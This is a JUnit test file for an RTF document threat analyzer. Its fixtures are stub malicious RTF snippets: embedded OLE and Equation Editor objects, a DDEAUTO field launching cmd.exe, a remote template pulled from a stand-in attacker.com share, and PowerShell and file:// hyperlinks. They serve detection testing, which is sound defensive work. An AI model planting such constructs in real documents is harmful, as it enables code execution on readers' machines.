package threat.rtf;

import org.junit.jupiter.api.Test;
import threat.common.FindingClassification;
import threat.common.SecurityFinding;
import threat.common.ThreatType;

import java.nio.file.Files;
import java.nio.file.Path;
import java.util.List;

import static org.junit.jupiter.api.Assertions.*;

public class RTFThreatAnalyzerTest {

    private final RTFThreatAnalyzer analyzer = new RTFThreatAnalyzer();

    @Test
    void detectsEmbeddedObjectInSampleRtf() throws Exception {
        String rtf = "{\\rtf1\\ansi{\\object\\objemb\\objclass Package{\\*\\objdata 0105000000000000}}}";
        Path sample = Files.createTempFile("docshield-embedded-", ".rtf");
        try {
            Files.writeString(sample, rtf);
            List<SecurityFinding> findings = analyzer.analyze(sample);

            assertFalse(findings.isEmpty());
            assertTrue(findings.stream().anyMatch(f ->
                    f.getClassification() == FindingClassification.THREAT &&
                    (f.getType() == ThreatType.EMBEDDED_OBJECT || f.getType() == ThreatType.EMBEDDED_ACTIVE_CONTENT)));
        } finally {
            Files.deleteIfExists(sample);
        }
    }

    @Test
    void detectsEquationEditorExploit() {
        String rtf = "{\\rtf1\\ansi{\\object\\objemb\\objclass Equation.3{\\*\\objdata 0105000000000000}}}";
        List<SecurityFinding> findings = analyzer.analyze(rtf);

        assertTrue(findings.stream().anyMatch(f ->
                f.getClassification() == FindingClassification.THREAT &&
                f.getType() == ThreatType.EMBEDDED_ACTIVE_CONTENT));
    }

    @Test
    void detectsEquationEditorClsid() {
        String rtf = "{\\rtf1\\ansi{\\object\\objemb\\oleclsid 0002CE02-0000-0000-C000-000000000046{\\*\\objdata 11223344}}}";
        List<SecurityFinding> findings = analyzer.analyze(rtf);

        assertTrue(findings.stream().anyMatch(f ->
                f.getClassification() == FindingClassification.THREAT &&
                f.getType() == ThreatType.EMBEDDED_ACTIVE_CONTENT));
    }

    @Test
    void detectsDDEAutoCommandExecution() {
        String rtf = "{\\rtf1\\ansi{\\field{\\*\\fldinst DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe \"/k whoami\"}{\\fldrslt Static Result}}}";
        List<SecurityFinding> findings = analyzer.analyze(rtf);

        assertTrue(findings.stream().anyMatch(f ->
                f.getClassification() == FindingClassification.THREAT &&
                f.getType() == ThreatType.DDE));
    }

    @Test
    void detectsExternalTemplateInjection() {
        String rtf = "{\\rtf1\\ansi{\\*\\template \\\\\\\\attacker.com\\\\share\\\\malicious.dotm}Hello World}";
        List<SecurityFinding> findings = analyzer.analyze(rtf);

        assertTrue(findings.stream().anyMatch(f ->
                f.getClassification() == FindingClassification.THREAT &&
                f.getType() == ThreatType.EXTERNAL_TEMPLATE));
    }

    @Test
    void detectsDangerousHyperlink() {
        String rtf = "{\\rtf1\\ansi{\\field{\\*\\fldinst HYPERLINK \"powershell.exe -enc AAAA\"}{\\fldrslt Click Me}}}";
        List<SecurityFinding> findings = analyzer.analyze(rtf);

        assertTrue(findings.stream().anyMatch(f ->
                f.getClassification() == FindingClassification.THREAT &&
                f.getType() == ThreatType.DANGEROUS_URI));
    }

    @Test
    void detectsFileSchemeHyperlink() {
        String rtf = "{\\rtf1\\ansi{\\field{\\*\\fldinst HYPERLINK \"file://C:/malware.exe\"}{\\fldrslt Download}}}";
        List<SecurityFinding> findings = analyzer.analyze(rtf);

        assertTrue(findings.stream().anyMatch(f ->
                f.getClassification() == FindingClassification.THREAT &&
                f.getType() == ThreatType.DANGEROUS_URI));
    }

    @Test
    void cleanSampleRtfProducesNoBlockingFindings() {
        List<SecurityFinding> findings = analyzer.analyze("{\\rtf1\\ansi This is a clean DocShield test fixture.}");
        assertFalse(findings.stream().anyMatch(f ->
                f.getClassification() == FindingClassification.THREAT ||
                f.getClassification() == FindingClassification.POLICY_VIOLATION));
    }

    @Test
    void detectsUnbalancedBraceStructure() {
        String malformedRtf = "{\\rtf1\\ansi Hello {World without closing brace";
        List<SecurityFinding> findings = analyzer.analyze(malformedRtf);

        assertTrue(findings.stream().anyMatch(f ->
                f.getClassification() == FindingClassification.POLICY_VIOLATION &&
                f.getType() == ThreatType.SUSPICIOUS_ARCHIVE));
    }
}
